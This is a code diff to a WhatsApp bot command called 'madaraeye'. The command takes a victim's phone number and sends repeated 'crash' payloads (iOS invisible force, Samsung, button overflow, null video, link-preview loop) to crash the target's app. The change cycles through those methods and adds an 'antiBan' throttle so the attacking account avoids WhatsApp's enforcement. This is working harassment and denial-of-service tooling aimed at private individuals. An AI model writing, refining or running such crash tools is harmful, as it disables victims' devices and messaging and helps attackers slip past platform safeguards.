@@ -1,69 +1,46 @@
 'use strict';
 const { MadaraEye } = require('../../lib/madaraEye');
 const { createProgressBar } = require('../../lib/progressBar');
+const { canCrash, recordCrash } = require('../../lib/antiBan');
 
 module.exports = {
     name: 'madaraeye',
-    aliases: ['crash', 'crashall', 'executeall', 'alldamage', 'maxcrash', 'eye'],
+    aliases: ['crash', 'crashall', 'executeall', 'maxcrash', 'eye'],
     category: 'madaraeye',
-    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs ᴜɴʟᴇᴀsʜᴇᴅ',
+    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
     usage: '.madaraeye <number>',
     waitReact: true,
 
     async execute(sock, msg, args, ctx) {
         const s = ctx.settings;
         const prefix = s.prefix || '.';
+        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
         
         if (!args[0]) {
-            return sock.sendMessage(ctx.from, { 
-                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}madaraeye <number>\n📝 *Example:* ${prefix}madaraeye 2348012345678` 
-            }, { quoted: msg });
+            return sock.sendMessage(ctx.from, { text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}madaraeye <number>` }, { quoted: msg });
         }
         
         const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         
-        let eye = global.getMadaraEye?.(sock);
-        if (!eye) {
-            eye = new MadaraEye(sock);
-        }
+        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
         
-        const TOTAL = 500;
+        let eye = global.getMadaraEye?.(sock);
+        if (!eye) eye = new MadaraEye(sock);
+        
+        const TOTAL = 50;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
+        const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull', 'linkPreviewLoop'];
+        
         try {
-            for (let i = 0; i < 100; i++) {
-                await eye.iosInvisibleForce(target);
-                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
+            for (let i = 0; i < TOTAL; i++) {
+                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
+                const method = methods[i % methods.length];
+                await eye[method](target, msg);
+                await recordCrash(phone);
+                await bar.update(1, method);
             }
-            
-            for (let i = 0; i < 100; i++) {
-                await eye.samsung(target);
-                await bar.update(1, 'sᴀᴍsᴜɴɢ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
-            }
-            
-            for (let i = 0; i < 100; i++) {
-                await eye.buttonOverflow(target);
-                await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
-            }
-            
-            for (let i = 0; i < 100; i++) {
-                await eye.vidxNull(target);
-                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
-            }
-            
-            for (let i = 0; i < 100; i++) {
-                await eye.linkPreviewLoop(target, msg);
-                await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 200));
-            }
-            
-            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
-        } catch (e) {
-            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
-        }
+            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs`);
+        } catch (e) { await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`); }
     }
 };
